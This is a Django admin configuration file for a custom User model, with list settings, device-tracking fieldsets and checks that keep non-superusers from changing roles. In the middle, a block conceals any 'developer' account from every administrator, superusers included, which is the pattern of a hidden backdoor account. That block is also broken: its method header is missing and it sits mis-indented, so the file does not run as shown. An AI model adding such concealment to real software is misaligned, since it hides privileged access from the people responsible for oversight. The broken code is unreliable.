"""
Admin configuration for Users app.
"""
from django.contrib import admin
from django.contrib.auth.admin import UserAdmin as BaseUserAdmin
from .models import User


@admin.register(User)
class UserAdmin(BaseUserAdmin):
    """Custom admin for User model."""
    
    list_display = ('username', 'email', 'role', 'is_active', 'is_staff', 'created_at', 'last_login')
    list_filter = ('role', 'is_active', 'is_staff', 'is_superuser')
    search_fields = ('username', 'email', 'full_name')
    ordering = ('-created_at',)
    
        # Hide 'developer' account from the list to prevent accidental deletion
        # Even superusers shouldn't see it in the list view unless they ARE the developer
        if request.user.username == 'developer':
             return qs
        
        return qs.exclude(username='developer').exclude(role='developer')
    
    fieldsets = (
        (None, {'fields': ('username', 'password')}),
        ('Personal Info', {'fields': ('full_name', 'email', 'phone')}),
        ('Permissions', {'fields': ('role', 'is_active', 'is_staff', 'is_superuser')}),
        ('Device Tracking', {'fields': ('device_fingerprint', 'last_login_device', 'last_login_ip')}),
        ('Important Dates', {'fields': ('last_login', 'created_at', 'updated_at')}),
    )
    
    add_fieldsets = (
        (None, {
            'classes': ('wide',),
            'fields': ('username', 'password1', 'password2', 'role', 'is_active'),
        }),
    )
    
    readonly_fields = ('created_at', 'updated_at', 'last_login')

    def get_readonly_fields(self, request, obj=None):
        """Restrict editing sensitive fields for non-superusers."""
        readonly = list(super().get_readonly_fields(request, obj))
        
        if not request.user.is_superuser:
            # Non-superusers cannot change their own or others' roles/staff status
            # to prevent self-promotion or unauthorized promotion.
            readonly.extend(['is_staff', 'is_superuser', 'role'])
            
        return readonly

    def save_model(self, request, obj, form, change):
        """Additional safety check on save."""
        if not request.user.is_superuser:
            # Force integrity for non-superusers attempting to bypass via form manipulation
            if change:
                old_obj = self.model.objects.get(pk=obj.pk)
                obj.is_staff = old_obj.is_staff
                obj.is_superuser = old_obj.is_superuser
                obj.role = old_obj.role
        super().save_model(request, obj, form, change)
